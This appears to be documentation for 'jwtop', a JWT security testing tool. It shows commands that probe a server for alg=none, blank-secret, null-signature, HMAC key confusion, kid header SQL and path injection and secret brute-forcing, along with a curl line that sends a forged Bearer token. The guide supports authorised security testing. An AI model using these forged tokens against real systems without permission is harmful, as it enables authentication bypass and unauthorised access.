# Test JWT security

JWTop provides two complementary tools for JWT security testing: `jwtop crack` probes a live server automatically, while `jwtop exploit` generates modified tokens for manual inspection or targeted tests.

> Use these tools only against systems you own or have explicit written permission to test.

## Automated server scan

`jwtop crack` sends a probe for each known exploit technique and reports which ones the server accepts.

```sh
jwtop crack $TOKEN --url https://api.example.com/protected
```

Sample output:

```
[+] algnone (none)              200  VULNERABLE
[ ] algnone (NONE)              401
[ ] algnone (None)              401
[ ] algnone (nOnE)              401
[ ] blanksecret                 401
[ ] nullsig                     401
[-] hmacconfusion               skipped (no public key provided)
[ ] kidinjection (sql)          401
[ ] kidinjection (path)         401
[-] secret                      skipped (not found in dictionary)
```

A `[+]` line means the server accepted the exploit. Exit code `0` means at least one exploit succeeded; `1` means none did.

**Include a public key to enable the hmacconfusion probe:**

```sh
jwtop crack $TOKEN --url https://api.example.com/protected \
  --key /path/to/public.pem
```

**Add a custom secret wordlist:**

```sh
jwtop crack $TOKEN --url https://api.example.com/protected \
  --wordlist /path/to/secrets.txt
```

## Manual exploit tokens

Use `jwtop exploit` when you need a specific modified token for a targeted test, a report, or a case where the server requires a non-standard request format.

**alg=none bypass:**

```sh
# Single variant
jwtop exploit algnone $TOKEN

# All four capitalisation variants (one per line)
jwtop exploit algnone --all $TOKEN
```

**Blank HMAC secret:**

```sh
jwtop exploit blanksecret $TOKEN
```

**Null signature (alg unchanged):**

```sh
jwtop exploit nullsig $TOKEN
```

**HMAC confusion (public key as secret):**

```sh
jwtop exploit hmacconfusion $TOKEN --key /path/to/public.pem
```

**kid header injection:**

```sh
# SQL injection variant
jwtop exploit kidinjection --mode sql $TOKEN

# Path traversal variant
jwtop exploit kidinjection --mode path $TOKEN
```

**Brute-force HMAC secret:**

```sh
jwtop exploit weaksecret $TOKEN
jwtop exploit weaksecret $TOKEN --wordlist /path/to/secrets.txt
```

## Using exploit tokens in scripts

Capture the output and send it as a Bearer token:

```sh
EXPLOITED=$(jwtop exploit algnone $TOKEN)
curl -si -H "Authorization: Bearer $EXPLOITED" https://api.example.com/protected \
  | head -1
```
